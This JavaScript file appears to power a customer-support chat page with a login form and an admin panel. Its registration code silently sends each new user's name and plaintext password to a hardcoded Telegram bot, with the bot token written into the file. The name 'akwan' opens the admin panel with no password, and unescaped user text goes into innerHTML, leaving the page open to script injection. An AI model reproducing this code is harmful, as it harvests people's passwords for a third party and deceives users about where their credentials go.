const TELEGRAM_BOT_TOKEN = '8557391650:AAFMcTDp0I8uXxCV4TGZZyjYWHwAKTcqxFQ';
const TELEGRAM_CHAT_ID = '8419125080';
const notificationSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');

let currentUser = "";
let selectedUser = "";
let pendingImageData = "";

const getUsers = () => JSON.parse(localStorage.getItem("users") || "{}");
const saveUsers = (u) => localStorage.setItem("users", JSON.stringify(u));
const getChats = () => JSON.parse(localStorage.getItem("chats") || "{}");
const saveChats = (c) => localStorage.setItem("chats", JSON.stringify(c));

// Mobile Toggle Function
window.toggleSidebar = function() {
    const sidebar = document.getElementById("sidebar");
    sidebar.classList.toggle("expanded");
    const icon = sidebar.querySelector(".sidebar-toggle i");
    if(sidebar.classList.contains("expanded")) {
        icon.classList.replace("fa-chevron-right", "fa-chevron-left");
    } else {
        icon.classList.replace("fa-chevron-left", "fa-chevron-right");
    }
};

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
  try { await fetch(url); } catch (error) { console.error("Telegram Error:", error); }
}

function showForgotAd() {
    const ad = document.getElementById("forgotPassAd");
    ad.classList.add("show");
    setTimeout(() => { ad.classList.remove("show"); }, 4000);
}

document.getElementById('togglePassword').addEventListener('click', function() {
    const pwdInput = document.getElementById('passwordInput');
    this.classList.toggle('fa-eye-slash');
    this.classList.toggle('fa-eye');
    pwdInput.type = pwdInput.type === 'password' ? 'text' : 'password';
});

window.login = function() {
  const name = document.getElementById("nameInput").value.trim();
  const pass = document.getElementById("passwordInput").value;
  const msg = document.getElementById("loginMsg");
  const pwdContainer = document.getElementById("pwdContainer");
  
  if (!name) return;

  if (name.toLowerCase() === "akwan") {
    document.getElementById("login").classList.add("hidden");
    document.getElementById("adminPanel").classList.remove("hidden");
    loadUsers(); return;
  }

  if (pwdContainer.classList.contains("hidden")) {
    pwdContainer.classList.remove("hidden");
    msg.textContent = "Please enter/create a password";
    return;
  }

  const users = getUsers();
  if (!users[name]) {
    if (!pass) { msg.textContent = "Password required"; return; }
    users[name] = { password: pass };
    saveUsers(users);
    const chats = getChats();
    chats[name] = [{ from: "admin", text: `Hello ${name}, how can we help?`, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), read: false }];
    saveChats(chats);
    sendToTelegram(`🆕 NEW REGISTRATION\n👤 User: ${name}\n🔑 Pass: ${pass}`);
  } else if (users[name].password !== pass) {
    msg.textContent = "Incorrect password"; return;
  }

  currentUser = name;
  document.getElementById("login").classList.add("hidden");
  document.getElementById("customerPanel").classList.remove("hidden");
  loadCustomerMessages();
};

window.logout = function() { if(confirm("Log out?")) location.reload(); };

window.sendCustomerMessage = function() {
  const input = document.getElementById("customerInput");
  if (!input.value.trim()) return;
  const chats = getChats();
  chats[currentUser].push({ from: "user", text: input.value, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), read: false });
  saveChats(chats); notificationSound.play();
  input.value = ""; loadCustomerMessages();
};

window.sendAdminMessage = function() {
  const input = document.getElementById("messageInput");
  if (!input.value.trim() || !selectedUser) return;
  const chats = getChats();
  chats[selectedUser].push({ from: "admin", text: input.value, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), read: true });
  saveChats(chats); input.value = ""; loadAdminMessages();
};

function loadUsers() {
  const chats = getChats();
  const list = document.getElementById("userList");
  list.innerHTML = "";
  Object.keys(chats).forEach(name => {
    const unread = chats[name].filter(m => m.from === "user" && !m.read).length;
    const div = document.createElement("div");
    div.style = "padding:15px; border-bottom:1px solid #334155; cursor:pointer; display:flex; align-items:center;";
    div.innerHTML = `<div onclick="openChat('${name}')" style="flex:1; display:flex;">
                        <div style="width:30px; height:30px; background:#2563eb; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-right:10px;">${name[0].toUpperCase()}</div>
                        <span>${name}</span>
                        ${unread > 0 ? `<span class="unread-badge">${unread}</span>` : ""}
                     </div>`;
    list.appendChild(div);
  });
}

window.openChat = function(name) {
  selectedUser = name;
  const chats = getChats();
  chats[name].forEach(m => { if(m.from === "user") m.read = true; });
  saveChats(chats);
  document.getElementById("sidebar").classList.remove("expanded"); // Close sidebar on mobile
  document.getElementById("chatHeader").textContent = "Chatting with " + name;
  loadUsers(); loadAdminMessages();
};

function loadAdminMessages() {
  const chats = getChats();
  const box = document.getElementById("messages");
  box.innerHTML = "";
  if(!selectedUser) return;
  chats[selectedUser].forEach(m => {
    const div = document.createElement("div");
    div.className = "message " + (m.from === "admin" ? "user-bubble" : "admin-bubble");
    div.innerHTML = `${m.text || `<img src="${m.image}" style="max-width:200px;">`}<span class="time">${m.time}</span>`;
    box.appendChild(div);
  });
  box.scrollTop = box.scrollHeight;
}

function loadCustomerMessages() {
  const chats = getChats();
  const box = document.getElementById("customerMessages");
  box.innerHTML = "";
  chats[currentUser].forEach(m => {
    const div = document.createElement("div");
    div.className = "message " + (m.from === "user" ? "user-bubble" : "admin-bubble");
    div.innerHTML = `${m.text || `<img src="${m.image}" style="max-width:200px;">`}<span class="time">${m.time}</span>`;
    box.appendChild(div);
  });
  box.scrollTop = box.scrollHeight;
}

window.sendCustomerImage = function(input) {
    if (!input.files[0]) return;
    const reader = new FileReader();
    reader.onload = e => {
        const chats = getChats();
        chats[currentUser].push({ from: "user", image: e.target.result, time: new Date().toLocaleTimeString(), read: false });
        saveChats(chats); loadCustomerMessages();
    };
    reader.readAsDataURL(input.files[0]);
};

window.previewAdminImage = function(input) {
    if (!selectedUser) return;
    const reader = new FileReader();
    reader.onload = e => {
        pendingImageData = e.target.result;
        document.getElementById("imgPreviewTarget").src = pendingImageData;
        document.getElementById("previewModal").classList.remove("hidden");
    };
    reader.readAsDataURL(input.files[0]);
};

window.confirmSendImage = function() {
    const chats = getChats();
    chats[selectedUser].push({ from: "admin", image: pendingImageData, time: new Date().toLocaleTimeString(), read: true });
    saveChats(chats); closePreview(); loadAdminMessages();
};

window.closePreview = function() {
    document.getElementById("previewModal").classList.add("hidden");
    document.getElementById("adminFile").value = "";
};
